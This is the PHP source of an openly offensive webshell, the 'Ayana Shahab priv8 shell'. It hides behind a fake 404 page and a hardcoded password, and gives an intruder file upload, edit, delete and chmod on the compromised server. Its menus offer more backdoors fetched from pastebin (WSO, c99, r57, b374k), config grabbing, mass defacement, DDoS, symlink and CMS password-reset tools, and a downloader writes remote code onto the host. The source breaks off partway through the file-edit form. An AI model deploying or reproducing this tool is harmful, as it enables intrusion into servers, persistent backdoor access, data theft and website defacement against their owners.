<?php
/***********************************************************************
# Webshell : Ayana shahab shell
# Author   : shutdown57 a.k.a alinko-kun
# copyright (c) 2016  ~ linuxcode.org
# Update   : http://pastebin.com/u/shutdown57
# Greets   : PeSec Team , WithOutShadow , linuxcode.org
************************************************************************/
session_start();
error_reporting(0);
ini_set('max_execution_time',0);
set_time_limit(0);
ini_set('error_log',NULL);
date_default_timezone_set("Asia/Jakarta");
define('judul','Ayana Shahab priv8 shell'); // Set title ;)
define('ar','<i class=\'fa fa-arrow-right\'></i>');
$s57_paswot = "77f3cb4ccd1f1ce48fd0b9ffee9a8658";//default password : achan , change with md5 type hash ;) .

function login() { 
$a_log ="<html><head><title>".judul."</title></head>";
$a_log.="<font color=red>achan</font>@<font color=blue>".$_SERVER['HTTP_HOST']."</font>:<font color=green>".getcwd()."</font> $ sudo su";
$a_log.="<form method='POST'><label for='pass'>[<font color=purple>sudo</font>]<font color=orange> password for achan</font>:</label><input type='password' name='pass' style='border:0;width:600px;'></form>";
$a_log.="</body></html>";   
if(empty($_GET['login'])=="achan"){
	echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL '.$_SERVER['REQUEST_URI'].' was not found on this server.</p>
<hr>
<address>'.$_SERVER['SERVER_SOFTWARE'].' Server at '.$_SERVER['HTTP_HOST'].' Port 80</address>
</body></html>
';
}else{
	echo $a_log;
}
    exit; 
} 

if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] )) 
    if( empty( $s57_paswot ) || 
        ( isset( $_POST['pass'] ) && ( md5($_POST['pass']) == $s57_paswot) ) ) 
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true; 
    else 
       login();
if(empty($_GET['i'])){
$d=getcwd();
}else{
$d=$_GET['i'];
}
function tentang(){
	$tentang="<center>
	<pre class='w3-code w3-text-indigo w3-text-shadow'>";
	$tentang.="
	+-------------------------------------------------+
	|          ~[ Ayana Shahab Priv8 Shell ]~         |
	|         c0dename  : Mrs.sl33pyH34d              |
	|         Author    : shutdown57 a.k.a alinko-kun |
	|         Written   : PHP,HTML,CSS(w3.css),JS     |
	+-------------------------------------------------+";
	$tentang.="</pre>";
	$tentang.="<h1 class='w3-indigo w3-text-shadow w3-animate-right'>Ayana Shahab priv8 shell</h1>";
	$tentang.="<h2 class='w3-white w3-text-shadow w3-animate-left'>linuxcode.org ~ WithOutShadow ~ PeSec Team</h2>";
	$tentang.="<h3 class='w3-indigo w3-text-shadow w3-animate-right'>Thanks for :</h3>";
	$tentang.="<h4 class='w3-white w3-text-shadow w3-animate-left'>God , You , sunr-15 , google.com ,pastebin.com , [-]sh4d0w_99[!] , MRG#7 , indoXploit , devilzc0de , StackOverFlow , w3schools , tutorialpoint </h4>";
	return $tentang;
}
function tentangAchan(){
	$usia=date('Y')-1997;
	$achan="<h3 class='w3-indigo w3-text-shadow w3-text-white w3-center'>About ayana shahab</h3>";
   $achan.="<center><img src='http://s19.postimg.org/6rkx4tpcj/achan65.jpg' border='0'  style='width:200px;height:230px;cursor:zoom-in;' class='w3-center w3-circle' onclick=\"document.getElementById('achan').style.display='block';\"/></center>";
   $achan.="<table class='w3-table w3-striped  w3-border w3-center'>";
   $achan.="<tr class='w3-blue'><td>Name :</td><td>Ayana Shahab</td></tr>";
   $achan.="<tr class='w3-light-blue'><td>Born :</td><td>Osaka, 3 June 1997 (age $usia)</td></tr>";
   $achan.="<tr class='w3-grey'><td>Member :</td><td>JKT48 at Team K3 </td></tr>";
   $achan.="<tr class='w3-blue-grey'><td>Career :</td><td>2011-2016 (JKT48 Team J) ,Dec 2016 (JKT48 Team K3)</td></tr>";
   $achan.="</table><div class='w3-modal' style='display:none;' id='achan'><a href='javascript:;' onclick=\"document.getElementById('achan').style.display='none';\" class='w3-btnclose w3-hover-indigo w3-btn-block'>&times; close</a><img src='http://s19.postimg.org/6rkx4tpcj/achan65.jpg' width='100%' hiegth='100%'></div>";
   $achan.='<hr><br><center><iframe width="560" height="315" src="https://www.youtube.com/embed/3Yt0dhb6ins?controls=0&amp;showinfo=0" frameborder="0" allowfullscreen></iframe></center>';
   return $achan;
}
function tentangJKT48(){
	$jkt="<div class='w3-container'><center><pre class='w3-code w3-text-indigo'>";
   $jkt.="
__      _ _  _______ _  _    ___   __
\ \    | | |/ /_   _| || |  ( _ ) / /
 \ \_  | | ' /  | | | || |_ / _ \/ / 
 / / |_| | . \  | | |__   _| (_) \ \ 
/_/ \___/|_|\_\ |_|    |_|  \___/ \_\
                                     
 Joyfull Kawaii Try to be the best
";
  $jkt.="</pre>";
  $jkt.="<iframe src='https://en.wikipedia.org/wiki/JKT48' style='width:80%;height:400px;' class='w3-indigo w3-border'></iframe>";
  $jkt.="</center></div>";
return $jkt;
}
$l=array(
	'adminer'=>"https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php",
	'wso'=>"http://pastebin.com/raw/N0eh3Q7Y",
	'bejak'=>"http://pastebin.com/raw/sQJVES6y",
	'indoxploit_shell'=>'http://pastebin.com/raw/nC6pWh5a',
	'andela'=>'http://pastebin.com/raw/0dkmjaWJ',
	'injection'=>'http://pastebin.com/raw/znH7r6Jr',
	'sbh'=>'http://pastebin.com/raw/SMDJVTF8',
	'bh'=>'http://pastebin.com/raw/3L2ESWeu',
	'c99'=>'http://pastebin.com/raw/Ms0ptnpH',
	'r57'=>'http://pastebin.com/raw/S9tzBgg3',
	);
function ambilcode($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
function ukuranupil($upil){
	$size = filesize($upil)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}
return $size;
}
function perms($file)
{
	if($mode=@fileperms($file)){
		$perms='';
		$perms .= ($mode & 00400) ? 'r' : '-';
		$perms .= ($mode & 00200) ? 'w' : '-';
		$perms .= ($mode & 00100) ? 'x' : '-';
		$perms .= ($mode & 00040) ? 'r' : '-';
		$perms .= ($mode & 00020) ? 'w' : '-';
		$perms .= ($mode & 00010) ? 'x' : '-';
		$perms .= ($mode & 00004) ? 'r' : '-';
		$perms .= ($mode & 00002) ? 'w' : '-';
		$perms .= ($mode & 00001) ? 'x' : '-';
		return $perms;
	}
	else return "??????????";
}
function lmodif($upil){
	$mod=date('d M Y [H:m]',filemtime($upil));
	return $mod;
}
function owngro($file){
$name=@posix_getpwuid(@fileowner($file));
$group=@posix_getgrgid(@filegroup($file));
$owngro=$name['name'].":".$group['name'];
return $owngro;
}
$html_a='<!DOCTYPE html>';
$html_a.='<html><head><title>'.judul.'</title><link rel="ICON" type="text/css" href="https://pbs.twimg.com/profile_images/740108670994763776/WvsElzwN.jpg">';

$html_a.='
<meta name="author" content="shutdown57">
<meta name="keywords" content="shutdown57,ayana shahab shell">
<meta name="description" content="ayana shahab shell c0ded  by shutdown57">
<link rel="stylesheet" href="http://www.w3schools.com/lib/w3.css">
<link rel="stylesheet" href="w3.css">
<link rel="stylesheet" href="http://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css">';
$html_a.='</head><body onload="haposurl();"><style type="text/css">
	*{font-size:12px;font-family: courier new;}a{text-decoration: none;}
</style>';
$nav_a ='<ul class="w3-navbar w3-left-align w3-large w3-indigo">';
$nav_a.='<li><a href="?index.php" class="w3-hover-white"><i class="fa fa-home"></i> Home</a></li>';
$nav_a.='<li class="w3-dropdown-hover"><a href="#" class="w3-hover-white"><i class="fa fa-user"></i> About</a>';
$nav_a.='<div class="w3-dropdown-content w3-white">';
$nav_a.='<a href="?a=tentang&i='.$d.'" class="w3-hover-indigo">'.ar.' about this</a>';
$nav_a.='<a href="?a=achan&i='.$d.'" class="w3-hover-indigo">'.ar.' about ayana shahab</a>';
$nav_a.='<a href="?a=jkt48&i='.$d.'" class="w3-hover-indigo">'.ar.' about JKT48</a></div></li>';
$nav_a.='<li class="w3-dropdown-hover"><a href="?a=terminal&i'.$d.'" class="w3-hover-white"><i class="fa fa-terminal"></i> Terminal</a>';
$nav_a.='<div class="w3-dropdown-content w3-white">'; 
$nav_a.='<a href="?a=shell&i='.$d.'" class="w3-hover-indigo">'.ar.' Shell <i class="fa fa-linux"></i></a>';
$nav_a.='<a href="?a=cmd&i='.$d.'" class="w3-hover-indigo">'.ar.' CMD <i class="fa fa-windows"></i></a>';
$nav_a.='</div></li>';
$nav_a.='<li class=" w3-dropdown-hover"><a href="#" class="w3-hover-white "><i class="fa fa-database"></i> Database assesment</a>';
$nav_a.='<div class="w3-dropdown-content w3-white"> ';
$nav_a.='<a href="?a=svc&i='.$d.'" class="w3-hover-indigo">'.ar.' SQLi vuln checker</a>';
$nav_a.='<a href="?a=adminer&i='.$d.'" class="w3-hover-indigo">'.ar.' Adminer</a>';
$nav_a.='<a href="?a=dbdump&i='.$d.'" class="w3-hover-indigo">'.ar.' DB Dump</a>';
$nav_a.='</div></li>';
$nav_a.='<li class="w3-dropdown-hover"><a href="#" class="w3-hover-white "><i class="fa fa-bold"></i> String tools</a>';
$nav_a.='<div class="w3-dropdown-content w3-white">';
$nav_a.='<a href="?a=hi&i='.$d.'" class="w3-hover-indigo">'.ar.' Hash identify</a>';
$nav_a.='<a href="?a=ph&i='.$d.'" class="w3-hover-indigo">'.ar.' Password Hash</a>';
$nav_a.='<a href="?a=ed&i='.$d.'" class="w3-hover-indigo">'.ar.' Enc0de & Dec0de</a>';
$nav_a.='<a href="?a=rs&i='.$d.'" class="w3-hover-indigo">'.ar.' Replace String</a>';
$nav_a.='</div></li>';
$nav_a.='<li class="w3-dropdown-hover"><a href="#" class="w3-hover-white "><i class="fa fa-universal-access"></i> Backdoor</a>';
$nav_a.='<div class="w3-dropdown-content w3-white">';
$nav_a.='<a href="?a=wso&i='.$d.'" class="w3-hover-indigo">'.ar.' WSO</a>';
$nav_a.='<a href="?a=injection&i='.$d.'" class="w3-hover-indigo">'.ar.' 1n73ction</a>';
$nav_a.='<a href="?a=bejak&i='.$d.'" class="w3-hover-indigo">'.ar.' b374k</a>';
$nav_a.='<a href="?a=andela&i='.$d.'" class="w3-hover-indigo">'.ar.' andela</a>';
$nav_a.='<a href="?a=idx&i='.$d.'" class="w3-hover-indigo">'.ar.' indoxploit</a>';
$nav_a.='<a href="?a=bh&i='.$d.'" class="w3-hover-indigo">'.ar.' Blackhat</a>';
$nav_a.='<a href="?a=sbh&i='.$d.'" class="w3-hover-indigo">'.ar.' Surabaya Blackhat</a>';
$nav_a.='<a href="?a=c&i='.$d.'" class="w3-hover-indigo">'.ar.' c99</a>';
$nav_a.='<a href="?a=r&i='.$d.'" class="w3-hover-indigo">'.ar.' r57</a>';
$nav_a.='</div></li>';
$nav_a.='<li class="w3-dropdown-hover"><a href="#" class="w3-hover-white "><i class="fa fa-firefox"></i> Web analisist</a>';
$nav_a.='<div class="w3-dropdown-content w3-white">';
$nav_a.='<a href="?a=cg&i='.$d.'" class="w3-hover-indigo">'.ar.' Config grabber</a>';
$nav_a.='<a href="?a=af&i='.$d.'" class="w3-hover-indigo">'.ar.' admin finder</a>';
$nav_a.='<a href="?a=md&i='.$d.'" class="w3-hover-indigo">'.ar.' Mass deface</a>';
$nav_a.='<a href="?a=wprp&i='.$d.'" class="w3-hover-indigo">'.ar.' WPRessPass</a>';
$nav_a.='<a href="?a=jrp&i='.$d.'" class="w3-hover-indigo">'.ar.' JoomRessPass</a>';
$nav_a.='<a href="?a=net&i='.$d.'" class="w3-hover-indigo">'.ar.' NetSploit</a>';
$nav_a.='<a href="?a=ddos&i='.$d.'" class="w3-hover-indigo">'.ar.' DDoS</a>';
$nav_a.='<a href="?a=em&i='.$d.'" class="w3-hover-indigo">'.ar.' eMail</a>';
$nav_a.='<a href="?a=zh&i='.$d.'" class="w3-hover-indigo">'.ar.' ZONE-H</a>';
$nav_a.='<a href="?a=sym&i='.$d.'" class="w3-hover-indigo">'.ar.' Symlink</a>';
$nav_a.='<a href="?a=rdp&i='.$d.'" class="w3-hover-indigo">'.ar.' RDP tools</a>';
$nav_a.='<a href="?a=fr&o='.$d.'" class="w3-hover-indigo">'.ar.' Fake root</a>';
$nav_a.='</div></li>';
$nav_a.='<li class="w3-dropdown-hover"><a href="#" class="w3-hover-white"><i class="fa fa-file-o"></i> SC Deface</a>';
$nav_a.='<div class="w3-dropdown-content w3-white">';
$nav_a.='<a href="?a=wos&i='.$d.'" class="w3-hover-indigo">'.ar.' WithOutShadow</a>';
$nav_a.='<a href="?a=ps&i='.$d.'" class="w3-hover-indigo">'.ar.' PeSeC Team</a>';
$nav_a.='</div></li>';
    if(isset($_GET['s'])){
   $nav_a.="<li class='w3-dropdown-hover'>";
   $nav_a.="<a href='#' class='w3-hover-white '>? Action</a>";
   $nav_a.="<div class='w3-dropdown-content'>";
   $nav_a.="<a href='?a=rename&i=$d&s=".$_GET['s']."'>".ar." Rename</a>";
   $nav_a.="<a href='?a=edit&i=$d&s=".$_GET['s']."'>".ar." Edit</a>";
   $nav_a.="<a href='?a=unlink&i=$d&s=".$_GET['s']."'>".ar." Delete</a>";
   $nav_a.="<a href='?a=chmod&i=$d&s=".$_GET['s']."'>".ar." Chmod</a>";
   $nav_a.="<a href='?a=download&i=$d&s=".$_GET['s']."'>".ar." Download</a>";
   $nav_a.="</div></li> ";
    }
 $nav_a.='<li title="Ayana Shahab Member JKT48 at Team K3" class="w3-dropdown-hover"><b><a class="w3-text-shadow w3-center w3-hover-pale-indigo" href="#"><i class="fa fa-paw"></i> Ayana Shahab Priv8 Shell <i class="fa fa-paw"></i></a></b>';
 $nav_a.='<div class="w3-dropdown-content w3-white">';
$nav_a.='<a href="?a=themes&i='.$d.'" class="w3-hover-indigo">'.ar.' Change Themes</a>';
$nav_a.='<a href="?a=pass&i='.$d.'" class="w3-hover-indigo">'.ar.' Change Password</a></div></li>';
 $nav_a.='<li class="w3-hover-white w3-right"><a href="?a=logout" class="w3-hover-white"><i class="fa fa-sign-out"></i>Logout</a></li></ul>';//end
 echo $html_a;
 echo $nav_a;

    $disabled=(is_writable($d)) ? : "disabled";
    if(isset($_POST['upfile'])){
	$files = array(
		            '1' => $_FILES['files']['name'], 
		            '2' => $_FILES['files2']['name'],
		            '3' => $_FILES['files3']['name'],
		            '4' => $_FILES['files4']['name'],
		            '5' => $_FILES['files5']['name']
		            );
	$tmp= array(
		'1' => $_FILES['files']['tmp_name'],
		'2' => $_FILES['files2']['tmp_name'],
		'3' => $_FILES['files3']['tmp_name'],
		'4' => $_FILES['files4']['tmp_name'],
		'5' => $_FILES['files5']['tmp_name']
		);
	$dir=array(
		'1' => $_POST['dir']."/",
		'2' => $_POST['dir2']."/",
		'3' => $_POST['dir3']."/",
		'4' => $_POST['dir4']."/",
		'5' => $_POST['dir5']."/"
		);
	move_uploaded_file($tmp['1'],$dir['1'].$files['1']);
	move_uploaded_file($tmp['2'],$dir['2'].$files['2']);
	move_uploaded_file($tmp['3'],$dir['3'].$files['3']);
	move_uploaded_file($tmp['4'],$dir['4'].$files['4']);
    move_uploaded_file($tmp['5'],$dir['5'].$files['5']);
    echo "<script>
    alert('Upload done!');
    </script>";
}
if(is_writable($d)){
	$stat='<font color="indigo">Writable [OK]</font>';
}else{
	$stat='<font color="grey">Not Writable [Read-Only]</font>';
}
 
    echo'<script type="text/javascript">
	function ijolno(anjing,kucing){
		document.getElementById(anjing).style.display="none";
		document.getElementById(kucing).style.display="block";
	}
	function upload(){
		document.getElementById("upload5").style.display="block";
	}
</script>';

echo'<div class="w3-modal " id="upload5" style="display:none;"><a href="javascript:;" onclick="document.getElementById(\'upload5\').style.display=\'none\';" class="w3-closebtn w3-hover-indigo" style="top:0;right:0;position:fixed;">&times;</a>';
echo'<div class="w3-container w3-modal-content w3-indigo w3-card-8 w3-center"><h3 class="w3-white w3-text-shadow">Uploader Files</h3>';
echo'<p> status upload file : '.$stat.'</p><table class="w3-table w3-border"><tr><td>file</td><td>Target Dir</td></tr><tr><td>';
echo'<form method="Post" enctype="multipart/form-data">';
$form_a='<input type="file" name="files" '.$disabled.'></td><td>';
$form_a.='<input type="text" name="dir" value="'.$d.'" class="w3-input"></td></tr><tr><td>';
$form_a.='<input type="file" name="files2" '.$disabled.'></td><td>';
$form_a.='<input type="text" name="dir2" value="'.$d.'" class="w3-input" ></td></tr><tr><td>';
$form_a.='<input type="file" name="files3"  '.$disabled.'></td><td>';
$form_a.='<input type="text" name="dir3" value="'.$d.'" class="w3-input"></td></tr><tr><td>';
$form_a.='<input type="file" name="files4" '.$disabled.'></td><td>';
$form_a.='<input type="text" name="dir4" value="'.$d.'" class="w3-input"></td></tr><tr><td>';
$form_a.='<input type="file" name="files5" '.$disabled.'></td><td>';
$form_a.='<input type="text" name="dir5" value="'.$d.'" class="w3-input"></td></tr></table><br>';
$form_a.='<input type="submit" name="upfile" class="w3-btn w3-btn-block w3-white" value="upload all"></form></div></div>';
echo $form_a;
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}

function convertByte($s) {
if($s >= 1073741824)
return sprintf('%1.2f',$s / 1073741824 ).' GB';
elseif($s >= 1048576)
return sprintf('%1.2f',$s / 1048576 ) .' MB';
elseif($s >= 1024)
return sprintf('%1.2f',$s / 1024 ) .' KB';
else
return $s .' B';
}
$os=(preg_match('/linux|Linux/',php_uname())) ? "<i class='fa fa-linux' title='linux'></i>" : "<i class='fa fa-windows' title='windows'></i>";
$sm= ini_get('safe_mode') ? "<font color=indigo> ON<?font>" : "<font color=grey> OFF</font>";
$mysql= function_exists('mysql_connect')?"<font color=indigo> ON</font>":"<font color=grey> OFF</font>";
$url_fp =ini_get('url_fopen')?"<font color=indigo> ON</font>":"<font color=grey> OFF</font>";
$curl=function_exists('curl_init')?"<font color=indigo> ON</font>":"<font color=grey> OFF</font>";
$df=ini_get('disable_functions') ? substr(ini_get('disable_functions'),0,50).",etc..." : "<font color=grey> NONE</font>";

echo "<hr>
<div class='w3-container w3-indigo'>
<div class='w3-row'>
<div class='w3-col m6 l6 s12 w3-animate-right'>
HOSTNAME : ".$_SERVER['HTTP_HOST']."<br>
Free Disk : ".convertByte(disk_free_space("/"))." / ".convertByte(disk_total_space("/"))."<br>
IP SERVER : ".gethostbyname($_SERVER['HTTP_HOST'])." | YOUR IP : ".$_SERVER['REMOTE_ADDR']." <br>
SERVER SOFTWARE : ".$_SERVER['SERVER_SOFTWARE']."<br>
User: <font color=indigo>".$user."</font> (".$uid.") Group: <font color=indigo>".$group."</font> (".$gid.")<br>
PHP version : ".phpversion()."-[<a href='?a=phpinfo&i=$d'>PHPINFO</a>]
CURL:".$curl."|safemode:".$sm."|URL FOPEN:".$url_fp."|MySQL:".$mysql."<br>
UNAME : ".php_uname()."<br>
DISABLE FUNCTIONS :".$df."<br>
</div>
<div class='w3-col m6 l6 s12 w3-animate-left'>
<form method='post' enctype='multipart/form-data'>
<table class='w3-table'><tr><td>File :</td><td>
<input type='file' name='upfile' class='w3-input w3-animate-input' style='width:200px;' ".$disabled."></td><td><button type='submit' name='subup' class='w3-btn w3-white w3-text-shadow'><i class='fa fa-upload'></i> upload</button></td></tr></table></form>";
if(isset($_POST['subup'])){
		if(move_uploaded_file($_FILES['upfile']['tmp_name'],$d."/".$_FILES['upfile']['name'])){
			echo "<script>
			alert('upload done!');
			</script>";
		}else{
			echo "<script>
			alert('upload failed');
			</script>";
		}
	}

echo"
<table class='w3-table'><tr><td><a href=\"javascript:ijolno('sengelek','sengapek');\"><i class='fa fa-hand-o-right' style='font-size:24px;'></i></a></td><td>
<div id='sengapek' style='display:none;'>
<form method='get'>
 <input type='text' value='".$d."' name='i' class='w3-input w3-animate-input w3-indigo' style='width:200px'>
 </form>
 </div>
<div id='sengelek'> 
	";

$d=str_replace('\\','/',$d);
$path = explode('/',$d);

foreach($path as $id=>$curdir){
if($curdir == '' && $id == 0){
$a = true;
echo '<a href="?i=/">/</a>';
continue;
}
if($curdir == '') continue;
echo '<a href="?i=';
for($i=0;$i<=$id;$i++){
echo "$path[$i]";
if($i != $id) echo "/";
}
echo '">'.$curdir.'</a>/';
}
$pwd=str_replace('\\','/',getcwd());
(is_writable($d))?$stat=" ~ <font color=indigo>WRITABLE</font>" :$stat="<font color=grey>NOT WRITABLE</font>";
echo $stat."</div></td></tr><tr class='w3-center'><td colspan='2'><a href='?index.php' class='w3-margin-left' title='home page.'><i class='fa fa-home' style='font-size:20px;'></i></a> <a href='javascript:history.go(-1);' class='w3-margin-left' title='go back one page,'><i class='fa fa-arrow-left' style='font-size:20px;'></i></a>  <a href='javascript:history.go(+1);' class='w3-margin-left' title='go forward one page.'><i class='fa fa-arrow-right' style='font-size:20px;'></i></a> <a href='".$_SERVER['REQUEST_URI']."' class='w3-margin-left' title='refresh page'><i class='fa fa-refresh' style='font-size:20px;'></i></a> <a href='javascript:;' class='w3-margin-left' onclick='upload();' title='Show uploader'><i class='fa fa-upload' style='font-size:20px;'></i></a></td></tr></table></div></div></div><hr>";
if(empty($_GET['a'])){
	echo'<form method="POST"><table class="w3-table w3-responsive w3-striped">';
	echo'<thead class="w3-indigo w3-hover-indigo"><th style="width:20px;">No.</th><th style="width:20px;">^</th><th style="width:250px;max-width:300px;">Name</th><th style="width:100px;">Size</th><th style="width:130px;max-width:180px;">Type</th><th style="width:160px;max-width:190px;">Group:Owner</th><th style="width:120px;">Permission</th><th style="width:150px;max-width:180px;">Last Modified</th><th style="width:120px;">Action</th></thead>';
	echo "<tr class='w3-hover-indigo'><td>0</td><td></td><td><a href='?i=".dirname("$d")."'><i class='fa fa-arrow-left'></i></a></td><td>--</td><td>achan/link</td><td>achan:ayana</td><td>~</td><td>~</td><td>
	 <div class='w3-dropdown-hover'>
  <a  href='#' class='w3-btn w3-indigo' style='border-radius:100%;-webkit-border-radius:100%;-o-border-radius:100%;-moz-border-radius:100%;'>?</a>
  <div class='w3-dropdown-content w3-border'>
    <a href='?a=mkdir&i=$d'>make directory</a>
    <a href='?a=mkfile&i=$d'>make file</a>
  </div>
</div> 
	</td>";
	$s=scandir($d);
	$no=1;
	$total_file=0;
	$total_dir=0;
	foreach ($s as $d2) {
	if(!is_dir("$d/$d2")||$d2=='.'||$d2=='..')continue;
	if(mime_content_type("$d/$d2")){
		$mime=mime_content_type("$d/$d2");
	}else{
		$mime="unknow/denied";
	}
	echo "<tr class='w3-hover-indigo'><td>".$no++."</td><td><input type='checkbox' class='w3-check' name='cekd[]' value='".$d."/".$d2."' ></td><td><i class='fa fa-folder'></i> <a href='?i=$d/$d2' title='dir : $d2'>$d2</a></td><td>".ukuranupil("$d/$d2")."</td><td>".$mime."</td><td>".owngro("$d/$d2")."</td><td>".perms("$d/$d2")."</td><td>".lmodif("$d/$d2")."</td><td>
	 <div class='w3-dropdown-hover'>
  <a  href='#' class='w3-btn w3-indigo' style='border-radius:100%;-webkit-border-radius:100%;-o-border-radius:100%;-moz-border-radius:100%;'>?</a>
  <div class='w3-dropdown-content w3-border'>
    <a href='?a=rename&i=$d&s=$d2'>Rename</a>
    <a href='?a=rmdir&i=$d&s=$d2'>Delete</a>
    <a href='?a=chmod&i=$d&s=$d2'>Chmod</a>
  </div>
</div> 
	</td></tr>";
	$total_dir++;
	}
	foreach ($s as $f) {
		if(!is_file("$d/$f")||$f=='.'||$f=='..')continue;
	if(mime_content_type("$d/$f")){
		$mime= mime_content_type("$d/$f");
	}else{
		$mime="unknow/denied";
	}
	echo "<tr class='w3-hover-indigo'><td>".$no++."</td><td><input type='checkbox' class='w3-check' name='cekf[]' value='".$d."/".$f."' ></td><td><i class='fa fa-file'></i> <a href='?i=$d&a=view&s=$f' title='file : $f'>$f</a></td><td>".ukuranupil("$d/$f")."</td><td>".$mime."</td><td>".owngro("$d/$f")."</td><td>".perms("$d/$f")."</td><td>".lmodif("$d/$f")."</td><td>
		 <div class='w3-dropdown-hover'>
  <a href='#' class='w3-btn w3-indigo' style='border-radius:100%;-webkit-border-radius:100%;-o-border-radius:100%;-moz-border-radius:100%;'>?</a>
  <div class='w3-dropdown-content w3-border'>
    <a href='?a=rename&i=$d&s=$f'>Rename</a>
      <a href='?a=edit&i=$d&s=$f'>Edit</a>
    <a href='?a=unlink&i=$d&s=$f'>Delete</a>
    <a href='?a=chmod&i=$d&s=$f'>Chmod</a>
    <a href='?a=download&i=$d&s=$f'>Download</a>
  </div>
</div> </td></tr>";
$total_file++;
	}
	echo '
<tr class="w3-indigo w3-text-shadow"><td colspan="9">
<select name="select" onchange="this.form.submit()" style="width:100%" class="w3-input w3-indigo w3-hover-white">
<option> action selected files | total : '.$total_file.' files & '.$total_dir.' directories | where : '.$d.'</option>
<option value="del">delete</option>
<option value="backup">backUp</option>
<option value="unzip">unzip</option>
<option value="gz">compress .gz</option>
<option value="tar"> compress .tar.gz </option>
</select></td></tr>
</table></form>';

if(isset($_POST['select'])){
	$file=$_POST['cekf'];
	$dir=$_POST['cekd'];
	if($_POST['select']=='del'){
		if($_POST['cekf']){
			
			foreach ($file as $cekf) {
				if(unlink($cekf)){
					echo"<meta http-equiv='refresh' content=0;url=>";
				}
			}
		}
	if($_POST['cekd']){
		
		foreach ($dir as $cekd) {
		if(rmdir($cekd)){
			echo"<meta http-equiv='refresh' content=0;url=>";
		}
		}}}elseif($_POST['select']=='backup'){
if($_POST['cekf']){

	foreach ($file as $copy) {
		$copi=basename($copy);
		if(!file_exists("backup")){
		@mkdir('backup');
	}
		if(copy($copy,"backup/".basename($copy))){
		echo"<meta http-equiv='refresh' content=0;url=?i=".getcwd()."/backup>";
		}else{
			echo "[<font color=grey>FAIL</font>]--> ".basename($Copy)."<br>";
		}
	}
}
}elseif ($_POST['select']=='unzip') {
	@mkdir("extract");
	foreach ($file as $unzip) {
		$zip = new ZipArchive;
$res = $zip->open($unzip);

if ($res === TRUE) {

$zip->extractTo("extract");

$zip->close();
        echo"<meta http-equiv='refresh' content=0;url=?i=".getcwd()."/extract>";
     } else {

echo "[<font color=grey>FAIL</font>] feiled!";
     }
	}
}elseif($_POST['select']=='gz'){
	if($_POST['cekf']){
		if(!file_exists("compress")){
			@mkdir("compress");
		}
foreach($file as $gz){
$gzfile = "compress/".basename($gz).".gz";
$fp = gzopen($gzfile, 'w9');
if(gzwrite($fp, file_get_contents($gz))){
	echo"<meta http-equiv='refresh' content=0;url=?i=".getcwd()."/compress>";
}
gzclose($fp);

}
}
}elseif ($_POST['select']=='tar') {
	try
{
    $a = new PharData('achan48.tar');
foreach($file as $tar){
    $a->addFile($tar);
}
    $a->compress(Phar::GZ);
    @unlink('achan48.tar');
} 
catch (Exception $e) 
{
    echo "Exception : " . $e;
}
}
}



}else{
	function refpage($url){
	echo'<meta http-equiv="refresh" content="0;URL='.$url.'">';
}

if($_GET['a']=='rename'){

	echo "<div class='w3-container w3-center'>
<h3 class='w3-indigo w3-text-white w3-text-shadow'>New name</h3>
<table><tr><td>
<form method='post'>newname :</td><td><input type='text' name='newname' value='".$_GET[s]."' class='w3-input w3-animate-input' style='width:200px'></td><td><input type='submit' value='>>' class='w3-btn w3-indigo'></td></tr></table></form>
	</div>";
	if(isset($_POST['newname'])){
		if(rename($_GET['i']."/".$_GET['s'],$_GET['i']."/".$_POST['newname'])){
			refpage('?i='.$_GET['i']);
		}else{
			refpage('?i='.$_GET['i']);
		}
	}
}elseif ($_GET['a']=='rmdir') {
	function rmdir_unlink_rmdir($d){
		if(!rmdir($d)){
		$s=scandir($d);
		foreach ($s as $ss) {
			if(is_file($d."/".$ss)){
				if(unlink($d."/".$ss)){
					rmdir($d);
					
				}
			}
			if(is_dir($d."/".$ss)){
				rmdir($d."/".$ss);
				rmdir($d);
				
			}
		}
	}
	}
	if(rmdir_unlink_rmdir($_GET['i']."/".$_GET['s'])){
		refpaage('?i='.$_GET['i']);
	}else{
		refpage('?i='.$_GET['i']);
	}
}elseif ($_GET['a']=='unlink') {
if(unlink($_GET['i']."/".$_GET['s'])){
	refpage('?i='.$_GET['i']);
}else{
	refpage('?i='.$_GET['i']);
}
}elseif ($_GET['a']=='view') {
	echo'
	<div class="w3-center w3-container">
	<h3 class="w3-indigo w3-text-white w3-text-shadow">View file</h3>
<p>Current file: <i>'.$_GET['i'].'/'.$_GET['s'].'</i></p></div>
';

		$f=$_GET['i'].'/'.$_GET['s'];
		$file = wordwrap(file_get_contents($f),160,"\n",true);
				$a= highlight_string($file,true);
				$old = array("0000BB","000000","FF8000","DD0000", "007700");
				$new = array("f00","000", "333333", "f000e1" , "FF8000");
				$a= str_ireplace($old,$new, $a);
				$result = $a;

	echo'
	<pre class="w3-codespan">'.$result.'</pre>';
}elseif ($_GET['a']=='edit') {
	echo "<div class='w3-center w3-container'>
	<h3 class='w3-indigo w3-text-white w3-text-shadow'>Edit file</h3>
	<form method='post'>
	<center><table><tr><td>
	save as :</td><td><input type='text' name='namabaru' value='".$_GET['s']."' class='w3-input w3-animate-input' style='width:200px'></td><td><input type='submit' value='>>' class='w3-btn w3-indigo' name='sbmt'></td></tr></table>
